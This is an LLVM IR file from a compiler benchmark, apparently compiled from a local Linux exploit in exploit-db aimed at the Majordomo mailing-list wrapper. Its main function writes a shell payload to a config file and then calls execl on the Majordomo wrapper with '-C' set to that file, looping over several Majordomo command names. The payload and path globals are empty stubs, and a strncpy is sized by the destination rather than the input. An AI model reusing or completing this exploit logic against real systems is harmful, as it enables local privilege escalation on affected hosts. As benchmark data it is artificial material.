; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19700.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19700.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"bounce-remind\00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"archive2.pl\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"config-test\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"digest\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"majordomo\00", align 1
@.str.5 = private unnamed_addr constant [15 x i8] c"request-answer\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"resend\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"-h\00", align 1
@MORPHEUS = common dso_local global i8* null, align 8
@O_WRONLY = common dso_local global i32 0, align 4
@O_TRUNC = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@SHELL = common dso_local global i8* null, align 8
@.str.8 = private unnamed_addr constant [5 x i8] c"auto\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"using : %s\0A\00", align 1
@MAJORDOMO = common dso_local global i32 0, align 4
@WRAPPER = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [3 x i8] c"-C\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"EXECL\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [30 x i8], align 16
  %7 = alloca [40 x i8*], align 16
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %10 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 1
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  %11 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 2
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i8** %11, align 16
  %12 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 3
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8** %12, align 8
  %13 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 4
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8** %13, align 16
  %14 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 5
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8** %14, align 8
  %15 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 6
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.5, i64 0, i64 0), i8** %15, align 16
  %16 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 7
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0), i8** %16, align 8
  %17 = load i32, i32* %4, align 4
  %18 = icmp eq i32 %17, 2
  br i1 %18, label %19, label %30

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @strcmp(i8* %22, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  %24 = icmp eq i64 %23, 0
  br i1 %24, label %25, label %30

25:                                               ; preds = %19
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @usage(i8* %28)
  br label %30

30:                                               ; preds = %25, %19, %2
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 2
  br i1 %32, label %33, label %41

33:                                               ; preds = %30
  %34 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %39 = call i32 @strlen(i8* %38)
  %40 = call i32 @strncpy(i8* %34, i8* %37, i32 %39)
  br label %44

41:                                               ; preds = %30
  %42 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %43 = call i32 @strcpy(i8* %42, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0))
  br label %44

44:                                               ; preds = %41, %33
  %45 = load i8*, i8** @MORPHEUS, align 8
  %46 = load i32, i32* @O_WRONLY, align 4
  %47 = load i32, i32* @O_TRUNC, align 4
  %48 = or i32 %46, %47
  %49 = load i32, i32* @O_CREAT, align 4
  %50 = or i32 %48, %49
  %51 = call i32 @open(i8* %45, i32 %50, i32 384)
  store i32 %51, i32* %9, align 4
  %52 = icmp slt i32 %51, 0
  br i1 %52, label %53, label %57

53:                                               ; preds = %44
  %54 = load i8*, i8** @MORPHEUS, align 8
  %55 = call i32 @perror(i8* %54)
  %56 = call i32 @exit(i32 1) #3
  unreachable

57:                                               ; preds = %44
  %58 = load i32, i32* %9, align 4
  %59 = load i8*, i8** @SHELL, align 8
  %60 = load i8*, i8** @SHELL, align 8
  %61 = call i32 @strlen(i8* %60)
  %62 = call i32 @write(i32 %58, i8* %59, i32 %61)
  %63 = load i32, i32* %9, align 4
  %64 = call i32 @close(i32 %63)
  %65 = call i32 (...) @intro()
  %66 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %67 = call i64 @strncmp(i8* %66, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %68 = icmp eq i64 %67, 0
  br i1 %68, label %69, label %95

69:                                               ; preds = %57
  store i32 1, i32* %8, align 4
  br label %70

70:                                               ; preds = %91, %69
  %71 = load i32, i32* %8, align 4
  %72 = icmp sle i32 %71, 7
  br i1 %72, label %73, label %94

73:                                               ; preds = %70
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 %75
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i8* %77)
  %79 = load i32, i32* @MAJORDOMO, align 4
  %80 = load i32, i32* @WRAPPER, align 4
  %81 = load i32, i32* %8, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [40 x i8*], [40 x i8*]* %7, i64 0, i64 %82
  %84 = load i8*, i8** %83, align 8
  %85 = load i8*, i8** @MORPHEUS, align 8
  %86 = call i32 @execl(i32 %79, i32 %80, i8* %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %85, i32 0)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %90

88:                                               ; preds = %73
  %89 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  br label %90

90:                                               ; preds = %88, %73
  br label %91

91:                                               ; preds = %90
  %92 = load i32, i32* %8, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %8, align 4
  br label %70

94:                                               ; preds = %70
  br label %107

95:                                               ; preds = %57
  %96 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %97 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i8* %96)
  %98 = load i32, i32* @MAJORDOMO, align 4
  %99 = load i32, i32* @WRAPPER, align 4
  %100 = getelementptr inbounds [30 x i8], [30 x i8]* %6, i64 0, i64 0
  %101 = load i8*, i8** @MORPHEUS, align 8
  %102 = call i32 @execl(i32 %98, i32 %99, i8* %100, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* %101, i32 0)
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %106

104:                                              ; preds = %95
  %105 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i64 0, i64 0))
  br label %106

106:                                              ; preds = %104, %95
  br label %107

107:                                              ; preds = %106, %94
  ret i32 0
}

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @intro(...) #1

declare dso_local i64 @strncmp(i8*, i8*) #1

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @execl(i32, i32, i8*, i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
